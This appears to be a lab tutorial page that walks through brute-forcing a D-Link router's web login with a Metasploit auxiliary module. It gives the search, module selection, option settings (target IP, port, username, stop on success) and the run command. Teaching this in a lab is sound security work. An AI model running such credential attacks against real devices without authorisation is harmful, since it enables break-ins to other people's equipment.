+++
title = "Brute Force Login"
date = 2021-10-18T20:39:54-06:00
weight = 2
+++


We can see if the login has been configured with weak credentials by using a brute force attack with a password list. There are several tools to do this. We will use a Metasploit.

## Metasploit

Metasploit is an exploitation framework that will allow us to select a target and run different modules. We will use a module created to automate login attempts against some dlink routers.

In a terminal, open up Metasploit. This will take a few seconds to boot up.

```bash
msf
```
You will eventually get a console session.

![images/msfconsole.png](/static/msfconsole.png)

Search for a `dlink` module thats an `auxiliary` type.
```
search dlink type:auxiliary
```
We get several results back.

![images/msf_search_dlink_results.png](/static/msf_search_dlink_results.png)

We will be using the `dlink_dir_session_cgi_http_login` module.

```
use scanner/http/dlink_dir_session_cgi_http_login
```
Each module has several fields that need to be set to run it. You can these fields by running `show options`.
```
show options
```
![images/dir815-show-options.png](/static/dir815-show-options.png)

Set the remote target IP.
```
set RHOSTS 172.21.0.23
```
Set the remote port
```
set RPORT 8080
```
Change the username to `Admin`.
```
set USERNAME Admin
```
Lastly, tell the module to stop once it finds a password
```
set STOP_ON_SUCCESS true
```

Now if we run `show options` again, we should see our fields updated.
```
show options
```
![images/dir815-options-set.png](/static/dir815-options-set.png)

Run the module
``
run
``

![images/dir815-run.png](/static/dir815-run.png)

The module should continue to try passwords until it finds the correct one.
